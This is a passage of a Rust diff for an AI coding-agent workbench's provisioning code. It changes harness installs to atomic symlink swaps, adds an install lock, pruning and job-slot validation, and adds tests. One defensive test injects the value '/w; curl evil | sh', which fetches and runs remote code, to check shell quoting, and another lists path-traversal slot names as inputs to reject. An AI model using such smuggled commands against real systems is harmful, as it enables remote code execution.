@@ -94,10 +94,19 @@ pub const OMP_PACKAGE: &str = "@oh-my-pi/pi-coding-agent";
 /// Everything the harness keeps on the department volume.
 pub const HARNESS_ROOT: &str = "/opt/data/workbench/harness";
 
-/// Where the pinned omp is installed, one directory per version, so a bump
-/// installs beside the old one and a job mid-session keeps running.
+/// Where the omp versions live: `omp/<version>` is a SYMLINK to the real
+/// install, `omp/.<version>.<stamp>`, and an install is swapped in by
+/// renaming a new symlink over it. A job already running keeps the directory
+/// it started from — nothing a job may be running is ever deleted — and a
+/// bump installs beside the old version. Old installs no process maps and
+/// nothing has touched for two days are pruned.
+pub fn omp_root() -> String {
+    format!("{HARNESS_ROOT}/omp")
+}
+
+/// The pinned version's path (the symlink [`omp_root`] describes).
 pub fn omp_install_dir() -> String {
-    format!("{HARNESS_ROOT}/omp/{OMP_VERSION}")
+    format!("{}/{OMP_VERSION}", omp_root())
 }
 
 /// omp's own entry point inside [`omp_install_dir`]. The launcher runs it on
@@ -121,20 +130,35 @@ pub fn omp_entry() -> String {
 /// it found — TALA-93 ran on the dir made for TALA-92.
 pub const JOB_HARNESS_ROOT: &str = "/opt/data/workbench/harness/jobs";
 
-/// A job's harness directory. `name` is a job uuid (validated by the caller)
-/// or the fixed `doctor` slot doctor probes through.
-pub fn job_harness_dir(name: &str) -> String {
-    format!("{JOB_HARNESS_ROOT}/{name}")
+/// Is `name` a harness slot: a job uuid (hyphenated, lowercase hex) or
+/// doctor's own [`DOCTOR_SLOT`]? Everything that builds a slot path goes
+/// through this, because teardown hands the path to `rm -rf`.
+pub fn valid_slot(name: &str) -> bool {
+    if name == DOCTOR_SLOT {
+        return true;
+    }
+    let b = name.as_bytes();
+    b.len() == 36
+        && b.iter().enumerate().all(|(i, c)| match i {
+            8 | 13 | 18 | 23 => *c == b'-',
+            _ => c.is_ascii_digit() || (b'a'..=b'f').contains(c),
+        })
+}
+
+/// A job's harness directory, for a [`valid_slot`] `name` — `None` for
+/// anything else.
+pub fn job_harness_dir(name: &str) -> Option<String> {
+    valid_slot(name).then(|| format!("{JOB_HARNESS_ROOT}/{name}"))
 }
 
 /// The job's `PI_CODING_AGENT_DIR`: omp's config, auth and databases.
-pub fn job_agent_dir(name: &str) -> String {
-    format!("{}/agent", job_harness_dir(name))
+pub fn job_agent_dir(name: &str) -> Option<String> {
+    job_harness_dir(name).map(|d| format!("{d}/agent"))
 }
 
 /// The job's launcher: the one command every invocation line starts with.
-pub fn job_launcher(name: &str) -> String {
-    format!("{}/omp", job_harness_dir(name))
+pub fn job_launcher(name: &str) -> Option<String> {
+    job_harness_dir(name).map(|d| format!("{d}/omp"))
 }
 
 /// The harness's slot in [`job_harness_dir`] that doctor probes through.
@@ -160,6 +184,15 @@ pub const WORKBENCH_CONFIG_DIR: &str = "/opt/workbench-config";
 /// prepare_env on a cloned repo, so a fresh Developer Agent's doctor, and every
 /// non-login shell, found no bun and omp could not start.
 pub fn harness_runtime_script() -> String {
+    runtime_script_for(HARNESS_XDG_DATA_HOME, AGENT_BIN_DIR, HARNESS_ROOT)
+}
+
+/// [`harness_runtime_script`] against other roots — the script the tests run
+/// for real, under a temp dir, with a stand-in bun.
+fn runtime_script_for(xdg: &str, bin: &str, harness_root: &str) -> String {
+    let root = format!("{harness_root}/omp");
+    let link = format!("{root}/{OMP_VERSION}");
+    let entry = format!("{link}/node_modules/{OMP_PACKAGE}/dist/cli.js");
     r#"set -eu
 export XDG_DATA_HOME="__XDG__" MISE_YES=1
 bin="__BIN__"
@@ -190,32 +223,83 @@ if [ -z "$real" ]; then
   fi
   ln -sfn "$real" "$bin/bun"
 fi
-omp_dir="__OMPDIR__"
+root="__OMPROOT__"
+link="__OMPDIR__"
 entry="__ENTRY__"
 started() { "$real" "$entry" --version 2>/dev/null | grep -qx "omp/__OMPV__"; }
-if [ ! -f "$entry" ] || ! started; then
-  mkdir -p "$(dirname "$omp_dir")"
-  # Two jobs provisioning at once install once: the second waits here, then
-  # finds the first one's install and skips its own.
+if ! started; then
+  mkdir -p "$root"
+  # One install at a time per volume, and NEVER without the lock: a second
+  # provision waits here, then finds the first one's install and skips its
+  # own. The wait is shorter than the exec's own timeout, so a waiter fails
+  # with this sentence rather than being killed mid-wait.
+  lock="$root/.install.lock"
   if command -v flock >/dev/null 2>&1; then
-    exec 9>"$(dirname "$omp_dir")/.install.lock"
-    flock -w 600 9 || true
+    exec 9>"$lock"
+    if ! flock -w __LOCKWAIT__ 9; then
+      echo "another provision held the Oh My Pi install lock for __LOCKWAIT__ s; provisioning again takes it once that install is done" >&2
+      exit 1
+    fi
+  else
+    waited=0
+    until mkdir "$lock.d" 2>/dev/null; do
+      holder=$(cat "$lock.d/pid" 2>/dev/null || true)
+      if [ -n "$holder" ] && ! kill -0 "$holder" 2>/dev/null; then
+        rm -rf "$lock.d"
+        continue
+      fi
+      if [ "$waited" -ge __LOCKWAIT__ ]; then
+        echo "another provision held the Oh My Pi install lock for __LOCKWAIT__ s; provisioning again takes it once that install is done" >&2
+        exit 1
+      fi
+      sleep 2
+      waited=$((waited + 2))
+    done
+    echo $$ > "$lock.d/pid"
+    trap 'rm -rf "$lock.d"' EXIT
   fi
-  if [ ! -f "$entry" ] || ! started; then
-    tmp="$omp_dir.tmp.$$"
-    rm -rf "$tmp"
-    mkdir -p "$tmp"
-    printf '{"name":"talaria-omp","private":true,"dependencies":{"__PKG__":"__OMPV__"}}\n' > "$tmp/package.json"
-    if ! (cd "$tmp" && BUN_INSTALL_CACHE_DIR="__HROOT__/bun-cache" "$real" install --production --no-progress >"$tmp/install.log" 2>&1); then
-      tail -n 15 "$tmp/install.log" >&2
-      rm -rf "$tmp"
+  if ! started; then
+    # Install beside whatever is there, prove it starts, then swap it in by
+    # renaming a symlink over the old one: atomic, and a job already running
+    # keeps the directory it started from. Nothing here deletes an install.
+    new="$root/.__OMPV__.$(date +%s).$$"
+    mkdir -p "$new"
+    printf '{"name":"talaria-omp","private":true,"dependencies":{"__PKG__":"__OMPV__"}}\n' > "$new/package.json"
+    if ! (cd "$new" && BUN_INSTALL_CACHE_DIR="__HROOT__/bun-cache" "$real" install --production --no-progress >"$new/install.log" 2>&1); then
+      tail -n 15 "$new/install.log" >&2
+      rm -rf "$new"
       echo "could not install Oh My Pi __OMPV__ (bun install, above)" >&2
       exit 1
     fi
-    rm -rf "$omp_dir"
-    mv "$tmp" "$omp_dir"
+    if ! "$real" "$new/node_modules/__PKG__/dist/cli.js" --version 2>/dev/null | grep -qx "omp/__OMPV__"; then
+      rm -rf "$new"
+      echo "Oh My Pi __OMPV__ installed but does not start on bun __BUN__" >&2
+      exit 1
+    fi
+    # An install from before installs were swapped is a real directory at the
+    # link's path: move it aside (a rename, so a process in it keeps running).
+    if [ -d "$link" ] && [ ! -L "$link" ]; then
+      mv "$link" "$root/.__OMPV__.moved.$(date +%s).$$"
+    fi
+    ln -s "$new" "$link.tmp.$$"
+    mv -T "$link.tmp.$$" "$link"
   fi
 fi
+# Prune: an install that is not the pinned one, that no running process maps
+# (omp's native addon and chunks are mapped from its own directory), and that
+# nothing has touched for two days. Then any version link left dangling.
+cur="$(readlink -f "$link" 2>/dev/null || true)"
+for d in "$root"/.[0-9]*; do
+  [ -d "$d" ] || continue
+  [ "$(readlink -f "$d")" = "$cur" ] && continue
+  grep -qsF "$d/" /proc/[0-9]*/maps 2>/dev/null && continue
+  [ -n "$(find "$d" -maxdepth 0 -mmin -2880 2>/dev/null)" ] && continue
+  rm -rf "$d"
+done
+for l in "$root"/*; do
+  [ -L "$l" ] || continue
+  [ -e "$l" ] || rm -f "$l"
+done
 if ! v=$("$real" "$entry" --version 2>&1); then
   echo "Oh My Pi __OMPV__ does not start on bun __BUN__: $(printf '%s' "$v" | tail -n 3)" >&2
   exit 1
@@ -224,15 +308,22 @@ echo "bun $("$real" --version)"
 echo "omp $v"
 echo "bunPath $real"
 "#
-    .replace("__XDG__", HARNESS_XDG_DATA_HOME)
-    .replace("__BIN__", AGENT_BIN_DIR)
+    .replace("__XDG__", xdg)
+    .replace("__BIN__", bin)
     .replace("__BUN__", HARNESS_BUN)
-    .replace("__OMPDIR__", &omp_install_dir())
-    .replace("__ENTRY__", &omp_entry())
+    .replace("__OMPROOT__", &root)
+    .replace("__OMPDIR__", &link)
+    .replace("__ENTRY__", &entry)
+    .replace("__LOCKWAIT__", &INSTALL_LOCK_WAIT_SECS.to_string())
     .replace("__OMPV__", OMP_VERSION)
     .replace("__PKG__", OMP_PACKAGE)
-    .replace("__HROOT__", HARNESS_ROOT)
+    .replace("__HROOT__", harness_root)
 }
+
+/// How long a provision waits for another one's omp install. Shorter than
+/// the exec that runs the script (`talaria-workbench-mcp`'s runtime timeout,
+/// 8 min), so a waiter answers with a reason instead of being killed.
+pub const INSTALL_LOCK_WAIT_SECS: u64 = 240;
 
 /// What [`harness_runtime_script`] reported.
 #[derive(Debug, Clone, PartialEq, Eq)]
@@ -264,8 +355,9 @@ pub fn parse_runtime(out: &str) -> Option<Runtime> {
 
 /// Lay out a job's harness directory, as the agent's user. `$1` is
 /// [`job_harness_dir`], `$2` the job's omp session dir (made here so the
-/// first run finds it); the launcher's text arrives on stdin
-/// ([`launcher_script`]).
+/// first run finds it), `$3` a path that must still exist (the job's
+/// `.git`; doctor's slot passes the workbench root); the launcher's text
+/// arrives on stdin ([`launcher_script`]).
 ///
 /// The agent dir LINKS the rendered files rather than copying them: the
 /// render rewrites `/opt/workbench-config` in place, so a changed role model
@@ -273,7 +365,13 @@ pub fn parse_runtime(out: &str) -> Option<Runtime> {
 /// a key. (Live, the agents' own copies inlined the persona key into
 /// `models.yml` to get past a 401.)
 pub const JOB_HARNESS_SH: &str = r#"set -eu
-dir="$1"; sessions="$2"; agent="$dir/agent"; cfg="__CFG__"
+dir="$1"; sessions="$2"; must="$3"; agent="$dir/agent"; cfg="__CFG__"
+# A job torn down while it was provisioning has no checkout any more: lay
+# nothing out for it, or this would re-create a dir the teardown removed.
+if [ ! -e "$must" ]; then
+  echo "the job's checkout ($must) is gone — the job ended while it was provisioning" >&2
+  exit 3
+fi
 mkdir -p "$agent" "$sessions"
 ln -sfn "$cfg/models.yml" "$agent/models.yml"
 ln -sfn "$cfg/mcp.json" "$agent/mcp.json"
@@ -309,8 +407,19 @@ pub const LAUNCHER_REFUSED: i32 = 78;
 /// [`LAUNCHER_REFUSED`], one sentence — when the gateway key is absent from
 /// the shell, rather than letting omp start and answer `401` or a missing
 /// model after the agent has already spent a turn on it.
-pub fn launcher_script(name: &str, workdir: &str, bun_path: &str, gateway: bool) -> String {
-    let agent = job_agent_dir(name);
+pub fn launcher_script(name: &str, workdir: &str, bun_path: &str, gateway: bool) -> Option<String> {
+    launcher_script_with(name, workdir, bun_path, gateway, &omp_entry())
+}
+
+/// [`launcher_script`] for another omp entry — the launcher the tests run.
+fn launcher_script_with(
+    name: &str,
+    workdir: &str,
+    bun_path: &str,
+    gateway: bool,
+    entry: &str,
+) -> Option<String> {
+    let agent = job_agent_dir(name)?;
     let key_check = if gateway {
         format!(
             "if [ -z \"${{{key}:-}}\" ]; then\n  echo \"talaria: {key} is not set in this shell, so Oh My Pi has no key for the Talaria gateway. The agent's sandbox predates the workbench key and must be rolled; this is not something to work around — report_problem.\" >&2\n  exit {code}\nfi\n",
@@ -320,26 +429,28 @@ pub fn launcher_script(name: &str, workdir: &str, bun_path: &str, gateway: bool)
     } else {
         String::new()
     };
-    format!(
+    Some(format!(
         "#!/bin/sh\n\
          # Oh My Pi {OMP_VERSION} on bun {HARNESS_BUN} for workbench job {name}.\n\
          # Written by Talaria's provisioning and rewritten on every provision: do not edit it,\n\
          # copy it, or wrap it. Its arguments go to omp as given.\n\
          export PI_CODING_AGENT_DIR={agent}\n\
-         export MISE_DATA_DIR=\"${{MISE_DATA_DIR:-${{XDG_DATA_HOME:-/opt/data/.local/share}}/mise}}\"\n\
+         export MISE_DATA_DIR=\"${{MISE_DATA_DIR:-${{XDG_DATA_HOME:-{xdg}}}/mise}}\"\n\
          export MISE_YES=1 MISE_TRUSTED_CONFIG_PATHS=/opt/data/workbench/jobs\n\
          PATH=\"$MISE_DATA_DIR/shims:$PATH\"\n\
          export PATH\n\
          {key_check}\
          cd {workdir} || {{ echo \"talaria: this job's checkout ({workdir}) is not there — call job_status\" >&2; exit {code}; }}\n\
          if [ -f .talaria/env ]; then set -a; . ./.talaria/env; set +a; fi\n\
+         [ -f {entry} ] || {{ echo \"talaria: Oh My Pi {OMP_VERSION} is not installed here any more — call job_status, which provisions this job again\" >&2; exit {code}; }}\n\
          exec {bun} {entry} \"$@\"\n",
         agent = sh_quote(&agent),
         workdir = sh_quote(workdir),
         bun = sh_quote(bun_path),
-        entry = sh_quote(&omp_entry()),
+        entry = sh_quote(entry),
         code = LAUNCHER_REFUSED,
-    )
+        xdg = HARNESS_XDG_DATA_HOME,
+    ))
 }
 
 /// The cheap preflight, run in the shell the AGENT'S terminal gives a
@@ -373,7 +484,8 @@ if ! { touch "$t" 2>/dev/null && rm -f "$t"; }; then
 fi
 if [ -n "$M" ]; then
   [ -r "$A/models.yml" ] || fail models "omp has no model catalog at $A/models.yml (-> $(readlink "$A/models.yml" 2>/dev/null))"
-  grep -qF -- "$M" "$A/models.yml" || fail models "the model catalog omp reads does not list $M, so omp would answer: Model \"talaria/$M\" not found"
+  sed -n 's/^[[:space:]]*-\{0,1\}[[:space:]]*id:[[:space:]]*//p' "$A/models.yml" | tr -d "\"'" | grep -qxF -- "$M" \
+    || fail models "the model catalog omp reads does not list $M, so omp would answer: Model \"talaria/$M\" not found"
   base=$(sed -n 's/^[[:space:]]*baseUrl:[[:space:]]*//p' "$A/models.yml" | head -n 1 | tr -d "\"'")
   [ -n "$base" ] || fail models "the model catalog at $A/models.yml names no baseUrl"
   code=$("__BUN__" -e 'try { const r = await fetch(process.argv[1] + "/models", { headers: { authorization: "Bearer " + (process.env.__KEY__ || "") }, signal: AbortSignal.timeout(20000) }); console.log(r.status) } catch (e) { console.log("unreachable: " + (e && e.message || e)) }' "$base" 2>&1 | tail -n 1)
@@ -747,19 +859,28 @@ pub fn sandbox_stale_reason(found: &str) -> Option<String> {
 mod tests {
     use super::*;
 
-    // omp's `engines.bun`, copied by hand from the npm package: a pin lowered
-    // under it fails here, a floor raised upstream does not.
-    const OMP_BUN_FLOOR: [u32; 3] = [1, 4, 4];
+    const JOB: &str = "11111111-2222-4333-8444-555555555555";
+
+    // The pinned omp release's `engines.bun`, read off npm FOR THAT RELEASE
+    // (`npm view @oh-my-pi/pi-coding-agent@<v> engines`). Tied to the version
+    // it was read for: bumping OMP_VERSION fails here until the floor is
+    // re-read, so a release whose floor outruns HARNESS_BUN cannot ship.
+    const OMP_BUN_FLOOR: (&str, [u32; 3]) = ("18.16.0", [1, 4, 4]);
 
     #[test]
-    fn the_pinned_bun_is_one_omp_will_start_on() {
+    fn the_pinned_bun_is_one_the_pinned_omp_will_start_on() {
+        assert_eq!(
+            OMP_VERSION, OMP_BUN_FLOOR.0,
+            "OMP_VERSION moved: re-read its engines.bun from npm and update OMP_BUN_FLOOR"
+        );
         let pin: Vec<u32> = HARNESS_BUN
             .split('.')
             .map(|part| part.parse().expect("HARNESS_BUN is a plain x.y.z"))
             .collect();
         assert!(
-            pin.as_slice() >= OMP_BUN_FLOOR.as_slice(),
-            "omp exits with `Bun runtime must be >= {OMP_BUN_FLOOR:?}` on bun {HARNESS_BUN}"
+            pin.as_slice() >= OMP_BUN_FLOOR.1.as_slice(),
+            "omp {OMP_VERSION} exits with `Bun runtime must be >= {:?}` on bun {HARNESS_BUN}",
+            OMP_BUN_FLOOR.1
         );
     }
 
@@ -786,11 +907,114 @@ mod tests {
         assert!(!s.contains("npx"), "no per-run registry resolution: {s}");
         assert!(s.contains(&format!("\"{OMP_PACKAGE}\":\"{OMP_VERSION}\"")));
         assert!(s.contains(&omp_install_dir()));
-        // It is proven by starting it, on the bun it will run on.
-        assert!(s.contains(&format!("grep -qx \"omp/{OMP_VERSION}\"")));
-        // Installed beside, then moved into place: a half-done install is
-        // never the one a launcher finds.
-        assert!(s.contains("mv \"$tmp\" \"$omp_dir\""));
+        assert!(
+            !s.contains("|| true\n  fi\n  if ! started"),
+            "the lock never falls through"
+        );
+        const { assert!(INSTALL_LOCK_WAIT_SECS * 1000 < 8 * 60_000) };
+    }
+
+    /// A stand-in bun: answers its own version, "installs" omp by writing a
+    /// cli.js that answers omp's, and runs such a cli.js. Counts installs.
+    #[cfg(unix)]
+    fn fake_bun(dir: &std::path::Path) -> std::path::PathBuf {
+        use std::os::unix::fs::PermissionsExt;
+        let bun = dir.join("fake-bun");
+        std::fs::write(
+            &bun,
+            format!(
+                "#!/bin/sh\n\
+                 if [ \"$1\" = --version ]; then echo {HARNESS_BUN}; exit 0; fi\n\
+                 if [ \"$1\" = install ]; then echo x >> \"{count}\"; mkdir -p node_modules/{OMP_PACKAGE}/dist; echo 'omp' > node_modules/{OMP_PACKAGE}/dist/cli.js; exit 0; fi\n\
+                 if [ \"$2\" = --version ] && [ -f \"$1\" ]; then echo omp/{OMP_VERSION}; exit 0; fi\n\
+                 exit 1\n",
+                count = dir.join("installs").display()
+            ),
+        )
+        .unwrap();
+        std::fs::set_permissions(&bun, std::fs::Permissions::from_mode(0o755)).unwrap();
+        bun
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn the_runtime_script_swaps_installs_in_and_never_deletes_one_in_place() {
+        use std::process::Command;
+        let tmp = std::env::temp_dir().join(format!("wbprov-runtime-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&tmp);
+        let bin = tmp.join("bin");
+        let hroot = tmp.join("harness");
+        std::fs::create_dir_all(&bin).unwrap();
+        let bun = fake_bun(&tmp);
+        std::os::unix::fs::symlink(&bun, bin.join("bun")).unwrap();
+        let script = runtime_script_for(
+            tmp.join("xdg").to_str().unwrap(),
+            bin.to_str().unwrap(),
+            hroot.to_str().unwrap(),
+        );
+        let run = || {
+            let out = Command::new("sh").args(["-c", &script]).output().unwrap();
+            assert!(
+                out.status.success(),
+                "{}",
+                String::from_utf8_lossy(&out.stderr)
+            );
+            parse_runtime(&String::from_utf8_lossy(&out.stdout)).expect("three lines")
+        };
+        let first = run();
+        assert_eq!(first.omp, format!("omp/{OMP_VERSION}"));
+        let link = hroot.join("omp").join(OMP_VERSION);
+        let installed = std::fs::read_link(&link).expect("the version path is a symlink");
+        assert!(
+            installed
+                .file_name()
+                .unwrap()
+                .to_str()
+                .unwrap()
+                .starts_with(&format!(".{OMP_VERSION}."))
+        );
+        // A second run finds it started: no second install.
+        run();
+        assert_eq!(
+            std::fs::read_to_string(tmp.join("installs"))
+                .unwrap()
+                .lines()
+                .count(),
+            1
+        );
+        // A broken install is replaced BESIDE the old one, which is kept for
+        // whatever job is still running from it (pruned only when unused and
+        // two days old).
+        std::fs::remove_file(installed.join(format!("node_modules/{OMP_PACKAGE}/dist/cli.js")))
+            .unwrap();
+        run();
+        let swapped = std::fs::read_link(&link).unwrap();
+        assert_ne!(swapped, installed, "a new install, swapped in");
+        assert!(
+            installed.exists(),
+            "the old install is not deleted under its jobs"
+        );
+        assert_eq!(
+            std::fs::read_to_string(tmp.join("installs"))
+                .unwrap()
+                .lines()
+                .count(),
+            2
+        );
+        // Made old, and unused, it is pruned on a later run; the current one is not.
+        let aged = Command::new("touch")
+            .args(["-d", "5 days ago"])
+            .arg(&installed)
+            .status()
+            .unwrap();
+        assert!(aged.success());
+        run();
+        assert!(
+            !installed.exists(),
+            "an unused install two days old is pruned"
+        );
+        assert!(swapped.exists(), "the pinned install never is");
+        let _ = std::fs::remove_dir_all(&tmp);
     }
 
     #[test]
@@ -809,30 +1033,61 @@ mod tests {
 
     #[test]
     fn every_job_gets_its_own_harness_dir_and_launcher() {
-        let a = job_harness_dir("11111111-1111-1111-1111-111111111111");
-        let b = job_harness_dir("22222222-2222-2222-2222-222222222222");
+        let a = job_harness_dir("11111111-1111-1111-1111-111111111111").unwrap();
+        let b = job_harness_dir("22222222-2222-2222-2222-222222222222").unwrap();
         assert_ne!(a, b);
-        assert!(job_agent_dir("x").starts_with(&job_harness_dir("x")));
-        assert!(job_launcher("x").starts_with(&job_harness_dir("x")));
+        let j = JOB;
+        assert!(
+            job_agent_dir(j)
+                .unwrap()
+                .starts_with(&job_harness_dir(j).unwrap())
+        );
+        assert!(
+            job_launcher(j)
+                .unwrap()
+                .starts_with(&job_harness_dir(j).unwrap())
+        );
         assert_ne!(
-            job_agent_dir("x"),
+            job_agent_dir(j).unwrap(),
             PI_CODING_AGENT_DIR,
             "never the shared dir every job used to fight over"
         );
+        assert!(job_harness_dir(DOCTOR_SLOT).is_some());
+    }
+
+    #[test]
+    fn a_slot_is_a_job_uuid_or_doctor_and_nothing_else() {
+        for bad in [
+            "",
+            "..",
+            "../x",
+            "abc",
+            "x/y",
+            "11111111-1111-1111-1111-11111111111",
+            "11111111-1111-1111-1111-1111111111111",
+            "11111111_1111-1111-1111-111111111111",
+            "AAAAAAAA-1111-1111-1111-111111111111",
+            "doctor/..",
+        ] {
+            assert!(job_harness_dir(bad).is_none(), "{bad:?}");
+            assert!(job_launcher(bad).is_none() && job_agent_dir(bad).is_none());
+            assert!(launcher_script(bad, "/w", "/b", true).is_none());
+        }
     }
 
     #[test]
     fn the_launcher_runs_omp_on_the_harness_bun_in_the_jobs_own_dir() {
         let l = launcher_script(
-            "abc",
+            JOB,
             "/opt/data/workbench/jobs/abc",
             "/opt/data/workbench/harness/xdg/mise/installs/bun/1.4.4/bin/bun",
             true,
-        );
+        )
+        .unwrap();
         assert!(l.starts_with("#!/bin/sh\n"), "{l}");
         assert!(l.contains(&format!(
             "export PI_CODING_AGENT_DIR={}\n",
-            job_agent_dir("abc")
+            job_agent_dir(JOB).unwrap()
         )));
         // omp is exec'd on the harness's bun by path: a repo's pinned bun on
         // PATH can no longer be the one omp checks its floor against.
@@ -851,7 +1106,7 @@ mod tests {
         assert!(l.contains(&format!("exit {LAUNCHER_REFUSED}")));
         // The key's NAME only, never a value, and never the personas' key.
         assert!(!l.contains("LLM_API_KEY") && !l.contains("OPENAI_API_KEY"));
-        let account = launcher_script("abc", "/w", "/b", false);
+        let account = launcher_script(JOB, "/w", "/b", false).unwrap();
         assert!(
             !account.contains(WORKBENCH_KEY_ENV),
             "a coding account's job needs no gateway key: {account}"
@@ -860,7 +1115,7 @@ mod tests {
 
     #[test]
     fn a_hostile_path_cannot_break_out_of_the_launcher() {
-        let l = launcher_script("abc", "/w; curl evil | sh", "/b", false);
+        let l = launcher_script(JOB, "/w; curl evil | sh", "/b", false).unwrap();
         assert!(l.contains("cd '/w; curl evil | sh' ||"), "{l}");
     }
 
@@ -895,6 +1150,210 @@ mod tests {
         // The gateway check is the model LIST, which spends nothing.
         assert!(s.contains("\"/models\""));
         assert!(!s.contains("chat/completions") && !s.contains(" -p "));
+    }
+
+    #[cfg(unix)]
+    fn script(path: &std::path::Path, body: &str) {
+        use std::os::unix::fs::PermissionsExt;
+        std::fs::write(path, format!("#!/bin/sh\n{body}\n")).unwrap();
+        std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o755)).unwrap();
+    }
+
+    #[cfg(unix)]
+    fn scratch(tag: &str) -> std::path::PathBuf {
+        let d = std::env::temp_dir().join(format!("wbprov-{tag}-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&d);
+        std::fs::create_dir_all(&d).unwrap();
+        d
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn the_launcher_stands_in_the_workdir_on_the_jobs_dir_and_refuses_without_the_key() {
+        use std::process::Command;
+        let tmp = scratch("launcher");
+        let work = tmp.join("work");
+        std::fs::create_dir_all(work.join(".talaria")).unwrap();
+        std::fs::write(work.join(".talaria/env"), "PROJECT_FLAG=on\n").unwrap();
+        let entry = tmp.join("cli.js");
+        std::fs::write(&entry, "").unwrap();
+        let bun = tmp.join("bun");
+        script(
+            &bun,
+            "echo \"dir=$PI_CODING_AGENT_DIR pwd=$(pwd) flag=$PROJECT_FLAG entry=$1 args=$2 $3\"",
+        );
+        let launcher = tmp.join("omp");
+        let text = launcher_script_with(
+            JOB,
+            work.to_str().unwrap(),
+            bun.to_str().unwrap(),
+            true,
+            entry.to_str().unwrap(),
+        )
+        .unwrap();
+        script(&launcher, text.trim_start_matches("#!/bin/sh\n"));
+        let out = Command::new(&launcher)
+            .args(["--mode", "json"])
+            .env(WORKBENCH_KEY_ENV, "k")
+            .current_dir(&tmp)
+            .output()
+            .unwrap();
+        assert!(
+            out.status.success(),
+            "{}",
+            String::from_utf8_lossy(&out.stderr)
+        );
+        let said = String::from_utf8_lossy(&out.stdout);
+        assert!(
+            said.contains(&format!("dir={}", job_agent_dir(JOB).unwrap())),
+            "{said}"
+        );
+        assert!(said.contains(&format!("pwd={}", work.display())), "{said}");
+        assert!(
+            said.contains("flag=on"),
+            "the project env is loaded: {said}"
+        );
+        assert!(
+            said.contains(&format!("entry={}", entry.display()))
+                && said.contains("args=--mode json"),
+            "{said}"
+        );
+        // No key in the shell: refused before omp starts, in one sentence.
+        let refused = Command::new(&launcher)
+            .env_remove(WORKBENCH_KEY_ENV)
+            .output()
+            .unwrap();
+        assert_eq!(refused.status.code(), Some(LAUNCHER_REFUSED));
+        assert!(String::from_utf8_lossy(&refused.stderr).contains(WORKBENCH_KEY_ENV));
+        // omp pruned from under it: refused with what to do.
+        std::fs::remove_file(&entry).unwrap();
+        let gone = Command::new(&launcher)
+            .env(WORKBENCH_KEY_ENV, "k")
+            .output()
+            .unwrap();
+        assert_eq!(gone.status.code(), Some(LAUNCHER_REFUSED));
+        assert!(String::from_utf8_lossy(&gone.stderr).contains("call job_status"));
+        let _ = std::fs::remove_dir_all(&tmp);
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn the_harness_dir_is_laid_out_only_while_the_job_still_has_a_checkout() {
+        use std::io::Write;
+        use std::process::{Command, Stdio};
+        let tmp = scratch("layout");
+        let dir = tmp.join("jobs").join(JOB);
+        let sessions = tmp.join("sessions");
+        let run = |must: &std::path::Path| {
+            let mut child = Command::new("sh")
+                .args(["-c", &job_harness_script(), "sh"])
+                .arg(&dir)
+                .arg(&sessions)
+                .arg(must)
+                .stdin(Stdio::piped())
+                .stdout(Stdio::piped())
+                .stderr(Stdio::piped())
+                .spawn()
+                .unwrap();
+            child
+                .stdin
+                .take()
+                .unwrap()
+                .write_all(b"#!/bin/sh\necho launcher\n")
+                .unwrap();
+            child.wait_with_output().unwrap()
+        };
+        // Torn down: nothing is re-created.
+        let ended = run(&tmp.join("work/.git"));
+        assert_eq!(ended.status.code(), Some(3));
+        assert!(!dir.exists(), "no harness dir for an ended job");
+        // Live: the agent dir links the render, the launcher is in place.
+        std::fs::create_dir_all(tmp.join("work/.git")).unwrap();
+        let out = run(&tmp.join("work/.git"));
+        assert!(
+            out.status.success(),
+            "{}",
+            String::from_utf8_lossy(&out.stderr)
+        );
+        assert_eq!(
+            std::fs::read_link(dir.join("agent/models.yml")).unwrap(),
+            std::path::Path::new(WORKBENCH_CONFIG_DIR).join("models.yml")
+        );
+        assert_eq!(
+            std::fs::read_to_string(dir.join("omp")).unwrap(),
+            "#!/bin/sh\necho launcher\n"
+        );
+        assert!(sessions.is_dir());
+        let _ = std::fs::remove_dir_all(&tmp);
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn the_preflight_fails_each_way_the_live_fleet_did_and_passes_a_good_harness() {
+        use std::process::Command;
+        let tmp = scratch("preflight");
+        let agent = tmp.join("agent");
+        std::fs::create_dir_all(&agent).unwrap();
+        std::fs::write(
+            agent.join("models.yml"),
+            "providers:\n  talaria:\n    baseUrl: http://gw/api/llm/v1\n    models:\n      - id: zai-outcrop/glm-5.3\n      - id: \"other\"\n",
+        )
+        .unwrap();
+        let good = tmp.join("omp-good");
+        script(&good, &format!("echo omp/{OMP_VERSION}"));
+        let old_bun = tmp.join("omp-oldbun");
+        script(
+            &old_bun,
+            "echo 'error: Bun runtime must be >= 1.4.4 (found v1.4.0)'; exit 1",
+        );
+        let gw200 = tmp.join("bun200");
+        script(&gw200, "echo 200");
+        let gw401 = tmp.join("bun401");
+        script(&gw401, "echo 401");
+        let run = |launcher: &std::path::Path, model: &str, bun: &std::path::Path, key: bool| {
+            let mut cmd = Command::new("bash");
+            cmd.args(["-c", &preflight_script(bun.to_str().unwrap()), "bash"])
+                .arg(launcher)
+                .arg(&agent)
+                .arg(model)
+                .arg("SOME_STRIPPED_NAME");
+            if key {
+                cmd.env(WORKBENCH_KEY_ENV, "k");
+            } else {
+                cmd.env_remove(WORKBENCH_KEY_ENV);
+            }
+            preflight_verdict(&String::from_utf8_lossy(&cmd.output().unwrap().stdout))
+        };
+        let m = "zai-outcrop/glm-5.3";
+        assert_eq!(
+            run(&good, m, &gw200, true),
+            Ok(format!("omp/{OMP_VERSION}"))
+        );
+        assert_eq!(run(&good, m, &gw200, false).unwrap_err().0, "key");
+        assert_eq!(run(&old_bun, m, &gw200, true).unwrap_err().0, "version");
+        let (check, detail) = run(&good, "zai-outcrop/glm-5", &gw200, true).unwrap_err();
+        assert_eq!(
+            check, "models",
+            "a prefix of a listed id is not that id: {detail}"
+        );
+        assert_eq!(
+            run(&good, "other", &gw200, true),
+            Ok(format!("omp/{OMP_VERSION}")),
+            "a quoted id matches"
+        );
+        let (check, detail) = run(&good, m, &gw401, true).unwrap_err();
+        assert_eq!(check, "gateway");
+        assert!(detail.contains("401"), "{detail}");
+        assert_eq!(
+            run(&tmp.join("missing"), m, &gw200, true).unwrap_err().0,
+            "launcher"
+        );
+        // A coding account's job: no gateway checks, no key needed.
+        assert_eq!(
+            run(&good, "", &gw401, false),
